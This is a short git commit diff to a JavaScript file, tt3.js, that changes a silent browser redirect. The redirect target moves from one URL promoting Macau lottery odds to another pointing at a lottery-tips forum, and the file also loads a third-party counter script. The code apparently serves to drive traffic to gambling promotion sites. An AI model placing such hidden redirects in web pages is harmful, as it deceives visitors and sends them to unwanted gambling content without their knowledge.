23898616fc4d2b0d317e57293e1e29705f4c9e73
js999999999 <js-9@outlook.com>
2017-06-06 21:29:57 +0800

    Update tt3.js

--- 2017qq/tt3.js
+++ 2017qq/tt3.js
@@ -7,5 +7,5 @@ document.write ('<script language="javascript" src="http://count4.51yes.com/clic
 }
 else
 {
-window.location.href="http://www.027067.com/#澳门新葡京（特码48.5倍）";
+window.location.href="http://www.180887.com/#180高手论坛";
 }
